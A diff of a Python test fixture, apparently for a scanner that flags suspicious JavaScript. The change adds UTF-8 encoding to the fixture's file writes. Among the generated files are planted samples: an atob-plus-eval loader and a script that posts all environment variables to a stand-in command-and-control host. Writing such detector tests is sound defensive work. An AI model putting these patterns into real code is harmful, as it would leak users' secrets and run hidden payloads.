@@ -82,16 +82,18 @@ def repository(tmp_path):
     root.mkdir()
     for i in range(MIN_FILES_FOR_PARALLEL + 60):
         (root / f"mod{i:04d}.js").write_text(
-            f"export const value{i} = {i};\nexport function f{i}(a) {{ return a + {i}; }}\n"
+            f"export const value{i} = {i};\nexport function f{i}(a) {{ return a + {i}; }}\n",
+            encoding="utf-8",
         )
     # A handful of real findings, so the comparison is not between two empty
     # results.
-    (root / "loader.js").write_text("const p = atob(BLOB);\neval(p);\n")
+    (root / "loader.js").write_text("const p = atob(BLOB);\neval(p);\n", encoding="utf-8")
     (root / "telemetry.js").write_text(
         "const { execSync } = require('child_process');\n"
         "const e = JSON.stringify(process.env);\n"
         "fetch('https://c2.example.net/i', {method:'POST', body:e});\n"
-        "execSync('true');\n"
+        "execSync('true');\n",
+        encoding="utf-8",
     )
     return root
 
